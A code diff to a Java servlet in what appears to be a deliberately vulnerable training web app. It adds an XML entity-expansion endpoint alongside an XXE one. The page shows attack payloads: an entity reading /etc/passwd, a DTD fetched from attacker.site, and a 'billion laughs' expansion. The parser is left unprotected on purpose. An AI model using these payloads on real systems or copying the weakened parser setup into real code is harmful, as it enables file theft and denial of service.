@@ -31,10 +31,10 @@ import org.xml.sax.SAXException;
 import org.xml.sax.helpers.DefaultHandler;
 
 @SuppressWarnings("serial")
-@WebServlet(urlPatterns = { "/xxe" })
+@WebServlet(urlPatterns = { "/xee", "/xxe" })
 // 2MB, 10MB, 50MB
 @MultipartConfig(fileSizeThreshold = 1024 * 1024 * 2, maxFileSize = 1024 * 1024 * 10, maxRequestSize = 1024 * 1024 * 50)
-public class XXEServlet extends HttpServlet {
+public class XEEandXXEServlet extends HttpServlet {
 
     private static final Logger log = LoggerFactory.getLogger(UnrestrictedSizeUploadServlet.class);
 
@@ -48,15 +48,19 @@ public class XXEServlet extends HttpServlet {
         Locale locale = req.getLocale();
 
         StringBuilder bodyHtml = new StringBuilder();
-        bodyHtml.append("<form method=\"post\" action=\"xxe\" enctype=\"multipart/form-data\">");
+        if ("/xee".equals(req.getServletPath())) {
+            bodyHtml.append("<form method=\"post\" action=\"xee\" enctype=\"multipart/form-data\">");
+        } else {
+            bodyHtml.append("<form method=\"post\" action=\"xxe\" enctype=\"multipart/form-data\">");
+        }
         bodyHtml.append(MessageUtils.getMsg("msg.add.users.by.xml", locale));
         bodyHtml.append("<br><br>");
         bodyHtml.append(ESAPI.encoder().encodeForHTML("<?xml version=\"1.0\"?>") + "<br>");
         bodyHtml.append(ESAPI.encoder().encodeForHTML("<users ou=\"ou=people,dc=t246osslab,dc=org\" >") + "<br>");
-        bodyHtml.append(TAB + ESAPI.encoder().encodeForHTML(
-                "<user uid=\"user01\" phone=\"090-1234-5678\" mail=\"user01@example.com\"/>") + "<br>");
-        bodyHtml.append(TAB + ESAPI.encoder().encodeForHTML(
-                "<user uid=\"user02\" phone=\"090-9876-5432\" mail=\"user02@example.com\">") + "<br>");
+        bodyHtml.append(TAB + ESAPI.encoder()
+                .encodeForHTML("<user uid=\"user01\" phone=\"090-1234-5678\" mail=\"user01@example.com\"/>") + "<br>");
+        bodyHtml.append(TAB + ESAPI.encoder()
+                .encodeForHTML("<user uid=\"user02\" phone=\"090-9876-5432\" mail=\"user02@example.com\">") + "<br>");
         bodyHtml.append(ESAPI.encoder().encodeForHTML("</users>"));
         bodyHtml.append("<br><br>");
         bodyHtml.append("<input type=\"file\" name=\"file\" size=\"60\" /><br>");
@@ -68,21 +72,47 @@ public class XXEServlet extends HttpServlet {
             bodyHtml.append(req.getAttribute("errorMessage"));
             bodyHtml.append("<br><br>");
         }
-        bodyHtml.append(MessageUtils.getMsg("msg.note.xxe.step1", locale));
-        bodyHtml.append("<br><br>");
-        bodyHtml.append(ESAPI.encoder().encodeForHTML("<!ENTITY % p1 SYSTEM \"file:///etc/passwd\">") + "<br>");
-        bodyHtml.append(ESAPI.encoder().encodeForHTML("<!ENTITY % p2 \"<!ATTLIST users ou CDATA '%p1;'>\">") + "<br>");
-        bodyHtml.append(ESAPI.encoder().encodeForHTML("%p2;"));
-        bodyHtml.append("<br><br>");
-        bodyHtml.append(MessageUtils.getMsg("msg.note.xxe.step2", locale));
-        bodyHtml.append("<br><br>");
-        bodyHtml.append(ESAPI.encoder().encodeForHTML("<?xml version=\"1.0\"?>") + "<br>");
-        bodyHtml.append(ESAPI.encoder()
-                .encodeForHTML("<!DOCTYPE users SYSTEM \"http://attacker.site/vulnerable.dtd\" >") + "<br>");
-        bodyHtml.append(ESAPI.encoder().encodeForHTML("<users />"));
+        if ("/xee".equals(req.getServletPath())) {
+            bodyHtml.append(MessageUtils.getMsg("msg.note.xee", locale));
+            bodyHtml.append("<br><br>");
+            bodyHtml.append(ESAPI.encoder().encodeForHTML("<?xml version=\"1.0\" encoding=\"UTF-8\" ?>") + "<br>");
+            bodyHtml.append(ESAPI.encoder().encodeForHTML("<!DOCTYPE s[") + "<br>");
+            bodyHtml.append(ESAPI.encoder().encodeForHTML("<!ENTITY x0 \"ha!\">") + "<br>");
+            bodyHtml.append(ESAPI.encoder().encodeForHTML("<!ENTITY x1 \"&x0;&x0;\">") + "<br>");
+            bodyHtml.append(ESAPI.encoder().encodeForHTML("<!ENTITY x2 \"&x1;&x1;\">") + "<br>");
+            bodyHtml.append(ESAPI.encoder().encodeForHTML("<!ENTITY x3 \"&x2;&x2;)\">") + "<br>");
+            bodyHtml.append(ESAPI.encoder().encodeForHTML("<!-- Entities from x4 to x98... -->") + "<br>");
+            bodyHtml.append(ESAPI.encoder().encodeForHTML("<!ENTITY x99 \"&x98;&x98;\">") + "<br>");
+            bodyHtml.append(ESAPI.encoder().encodeForHTML("<!ENTITY x100 \"&x99;&x99;\">") + "<br>");
+            bodyHtml.append(ESAPI.encoder().encodeForHTML("]>") + "<br>");
+            bodyHtml.append(ESAPI.encoder().encodeForHTML("<soapenv:Envelope xmlns:soapenv=\"...\" xmlns:ns1=\"...\">")
+                    + "<br>");
+            bodyHtml.append(TAB + ESAPI.encoder().encodeForHTML("<soapenv:Header>") + "<br>");
+            bodyHtml.append(TAB + ESAPI.encoder().encodeForHTML("</soapenv:Header>") + "<br>");
+            bodyHtml.append(TAB + ESAPI.encoder().encodeForHTML("<soapenv:Body>") + "<br>");
+            bodyHtml.append(TAB + TAB + ESAPI.encoder().encodeForHTML("<ns1:reverse>") + "<br>");
+            bodyHtml.append(TAB + TAB + TAB + ESAPI.encoder().encodeForHTML("<s>&x100;</s>") + "<br>");
+            bodyHtml.append(TAB + TAB + ESAPI.encoder().encodeForHTML("</ns1:reverse>") + "<br>");
+            bodyHtml.append(TAB + ESAPI.encoder().encodeForHTML("</soapenv:Body>") + "<br>");
+            bodyHtml.append(ESAPI.encoder().encodeForHTML("</soapenv:Envelope>") + "<br>");
+        } else {
+            bodyHtml.append(MessageUtils.getMsg("msg.note.xxe.step1", locale));
+            bodyHtml.append("<br><br>");
+            bodyHtml.append(ESAPI.encoder().encodeForHTML("<!ENTITY % p1 SYSTEM \"file:///etc/passwd\">") + "<br>");
+            bodyHtml.append(
+                    ESAPI.encoder().encodeForHTML("<!ENTITY % p2 \"<!ATTLIST users ou CDATA '%p1;'>\">") + "<br>");
+            bodyHtml.append(ESAPI.encoder().encodeForHTML("%p2;"));
+            bodyHtml.append("<br><br>");
+            bodyHtml.append(MessageUtils.getMsg("msg.note.xxe.step2", locale));
+            bodyHtml.append("<br><br>");
+            bodyHtml.append(ESAPI.encoder().encodeForHTML("<?xml version=\"1.0\"?>") + "<br>");
+            bodyHtml.append(
+                    ESAPI.encoder().encodeForHTML("<!DOCTYPE users SYSTEM \"http://attacker.site/vulnerable.dtd\" >")
+                            + "<br>");
+            bodyHtml.append(ESAPI.encoder().encodeForHTML("<users />"));
+        }
         bodyHtml.append("</form>");
-        HTTPResponseCreator.createSimpleResponse(res, MessageUtils.getMsg("title.xxe", locale),
-                bodyHtml.toString());
+        HTTPResponseCreator.createSimpleResponse(res, MessageUtils.getMsg("title.xxe", locale), bodyHtml.toString());
     }
 
     protected void doPost(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {
@@ -139,29 +169,35 @@ public class XXEServlet extends HttpServlet {
             SAXParser parser;
             CustomHandler customHandler = new CustomHandler();
             try {
+                File file = new File(savePath + File.separator + fileName);
                 SAXParserFactory spf = SAXParserFactory.newInstance();
-                spf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
+                if ("/xee".equals(req.getServletPath())) {
+                    spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
+                    spf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
+                } else {
+                    spf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
+                }
                 parser = spf.newSAXParser();
-                parser.parse(new File(savePath + File.separator + fileName), customHandler);
-                
+                parser.parse(file, customHandler);
+
                 // TODO Implement registration
                 isRegistered = true;
             } catch (ParserConfigurationException e) {
                 log.error("ParserConfigurationException occurs: ", e);
             } catch (SAXException e) {
                 log.error("SAXException occurs: ", e);
+            } catch (Exception e) {
+                log.error("Exception occurs: ", e);
             }
 
             StringBuilder bodyHtml = new StringBuilder();
-            if (isRegistered) {
+            if (isRegistered && customHandler.isRegistered()) {
                 bodyHtml.append(MessageUtils.getMsg("msg.batch.registration.complete", locale));
             } else {
                 bodyHtml.append(MessageUtils.getMsg("msg.batch.registration.fail", locale));
             }
-            if (isRegistered) {
-                bodyHtml.append("<br><br>");
-                bodyHtml.append(customHandler.getResult());
-            }
+            bodyHtml.append("<br><br>");
+            bodyHtml.append(customHandler.getResult());
             bodyHtml.append("<br><br>");
             bodyHtml.append("<INPUT type=\"button\" onClick='history.back();' value=\""
                     + MessageUtils.getMsg("label.history.back", locale) + "\">");
@@ -184,15 +220,22 @@ public class XXEServlet extends HttpServlet {
         }
         return null;
     }
-    
+
     public class CustomHandler extends DefaultHandler {
         private StringBuilder result = new StringBuilder();
+        private boolean isRegistered = false;
+        private boolean isOuExist = false;
 
         @Override
         public void startElement(String uri, String localName, String qName, Attributes attributes)
                 throws SAXException {
             if ("users".equals(qName)) {
-                result.append("<p>ou: " + ESAPI.encoder().encodeForHTML(attributes.getValue("ou")) + "</p>");
+                String ou = attributes.getValue("ou");
+                if (ou == null || "".equals(ou)) {
+                    return;
+                }
+                isOuExist = true;
+                result.append("<p>ou: " + ESAPI.encoder().encodeForHTML(ou) + "</p>");
                 result.append("<hr/>");
                 result.append("<div  class=\"container\">");
                 result.append("<table class=\"table table-striped table-bordered table-hover\">");
@@ -201,12 +244,13 @@ public class XXEServlet extends HttpServlet {
                 result.append("<th>phone</th>");
                 result.append("<th>mail</th>");
                 result.append("</tr>");
-            } else if ("user".equals(qName)) {
+            } else if (isOuExist && "user".equals(qName)) {
                 result.append("<tr>");
                 result.append("<td>" + ESAPI.encoder().encodeForHTML(attributes.getValue("uid")) + "</td>");
                 result.append("<td>" + ESAPI.encoder().encodeForHTML(attributes.getValue("phone")) + "</td>");
                 result.append("<td>" + ESAPI.encoder().encodeForHTML(attributes.getValue("mail")) + "</td>");
                 result.append("</tr>");
+                isRegistered = true;
             }
         }
 
@@ -220,6 +264,10 @@ public class XXEServlet extends HttpServlet {
 
         String getResult() {
             return result.toString();
+        }
+
+        boolean isRegistered() {
+            return isRegistered;
         }
     }
 }
